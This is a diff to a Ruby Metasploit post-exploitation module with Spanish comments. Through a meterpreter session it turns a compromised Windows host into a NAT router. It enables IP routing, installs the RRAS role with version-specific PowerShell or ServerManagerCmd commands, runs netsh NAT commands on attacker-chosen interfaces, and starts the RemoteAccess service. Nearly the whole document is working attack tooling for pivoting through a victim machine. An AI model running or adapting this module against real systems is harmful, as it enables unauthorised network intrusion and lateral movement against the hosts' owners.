@@ -86,7 +86,16 @@ class MetasploitModule < Msf::Post
 			print_status("	Service RemoteAccess status: #{rra_status}")
 			print_status("	IPEnableRouter value: #{iprouting_status}")
 			puts("")
-			print_status("Starting the proccess...")
+			print_status("Starting the proccess...")			
+			
+			##################################
+			# Bloque de versiones de windows #
+			##################################
+			
+			win_version = session.sys.config.sysinfo
+			
+			# Primer bloque común a todas las versiones
+			
 			print_status("	Enabling IP Router...")
 			
 			if rra_status != 'Started'
@@ -100,67 +109,59 @@ class MetasploitModule < Msf::Post
 				print_good("	IP Routing is Enabled.")
 			end
 			
-			
-			###############################
-			#Bloque de versiones de windows
-			##################################
-			#ponemos a continuacion el codigo comun a todos 
-
-			#ponemos en cada bloque el codigo especifico a la version:
-			win_version = session.sys.config.sysinfo
-			if win_version['OS']=~ /Windows 8/ or  win_version['OS']=~ /Windows 7/ or  win_version['OS']=~ /Windows 10/
-			elsif win_version['OS']=~ /Windows 2003/ or win_version['OS']=~ /Windows XP/
-			elsif win_version['OS']=~ /Windows 2012/
-			else	
-			end
-			########Fin bloque############
-			
-			
-			# https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc732263(v=ws.11)#BKMK_cmd
-			# ¿Es Windows Vista, 7, 8, 8.1 o 10?
-			# 	Fin del módulo
-			# ¿Es windows 2008,2012 o 2016?
+			# Primer bloque especifico para cada version
+						
+			if win_version['OS']=~ /Windows 2008/
 				if have_powershell?
 					print_status("Powershell is installed. Trying to install the services.")
-					# Ejecutar en powershell: Import-Module Servermanager ; Add-WindowsFeature NPAS-RRAS-Services
 					# En SSOO de 64 bits hay que ejecutar powershell de 64 bits para que funcione, si la shell/meterpreter es para 32 bits no funciona porque no existe el módulo ServerManager. Habría que comprobarlo en un W2008, W2012 y W2016 de 32 bits.
 					# Windows 2008
-					# print_status(psh_exec("Get-Module -ListAvailable ; Import-Module ServerManager; Add-WindowsFeature NPAS-RRAS-Services"))
-					# Windows 2012
-					print_status(psh_exec("Import-Module ServerManager; Add-WindowsFeature Routing"))
+					print_status(psh_exec("Import-Module ServerManager; Add-WindowsFeature NPAS-RRAS-Services"))
 				else
 					print_bad("Powershell is not installed. Trying to install from command line...")
 					print_status(cmd_exec("c:\Windows\system32\ServerManagerCmd.exe -install NPAS-RRAS-Services"))
-					# Exit del modulo
 				end
-			# Si es WinXP o W2003 funciona sin instalar roles, y sería ejecutar desde aquí.
+			elsif win_version['OS']=~ /Windows 2012/
+				if have_powershell?
+					print_status("Powershell is installed. Trying to install the services.")
+					print_status(psh_exec("Import-Module ServerManager; Add-WindowsFeature Routing"))
+				else
+					print_bad("Powershell is not installed. For this windows version (#{win_version['OS']}) we can't continue the execution.")
+				end
+			elsif win_version['OS']=~ /Windows 8/ or  win_version['OS']=~ /Windows 7/ or  win_version['OS']=~ /Windows 10/
+				print_bad("The system is not compatible with this module.")
+			end
+			
+			# Segundo bloque comun a todas las versiones
 			print_status(cmd_exec("netsh routing ip nat install"))
 			print_status(cmd_exec("netsh routing ip nat add interface \"#{datastore['NInt02']}\" full"))
 			print_status(cmd_exec("netsh routing ip nat add interface \"#{datastore['NInt01']}\" private"))
 			
+			# Segundo bloque especifico para cada version
 			print_status("	Enabling Routing and Remote Access service...")
-			# Windows XP, 2003, 2008
-			# if service_change_startup("RemoteAccess",2)
-				# print_good("	RemoteAccess service enabled.")
-			# else
-				# print_bad("  	There was an error enabling RemoteAccess service.")
-				# Exit
-			# end
+			if win_version['OS']=~ /Windows 2012/
+				cmd_exec ("sc config RemoteAccess start= auto")
+				print_status("	Starting Routing and Remote Access service...")
+				cmd_exec("net start RemoteAccess")
+			else # Resto de versiones hasta el momento, falta probar 2016
+				if service_change_startup("RemoteAccess",2)
+					print_good("	RemoteAccess service enabled.")
+				else
+					print_bad("  	There was an error enabling RemoteAccess service.")
+					# Exit
+				end
+				print_status("	Starting Routing and Remote Access service...")
+				if service_start("RemoteAccess")
+					print_good("	RemoteAccess service started.")
+				else
+					print_bad("  	There was an error starting RemoteAccess service.")
+					# Exit
+				end
+			end
 			
-			# windows 2012
-			cmd_exec ("sc config RemoteAccess start= auto")
-						
-			print_status("	Starting Routing and Remote Access service...")
-			# Windows XP, 2003, 2008
-			# if service_start("RemoteAccess")
-				# print_good("	RemoteAccess service started.")
-			# else
-				# print_bad("  	There was an error starting RemoteAccess service.")
-				# Exit
-			# end
-			
-			# windows 2012
-			cmd_exec("net start RemoteAccess")
+			########Fin bloque############
+	
+			# https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc732263(v=ws.11)#BKMK_cmd
 			
 			puts("")
 		else
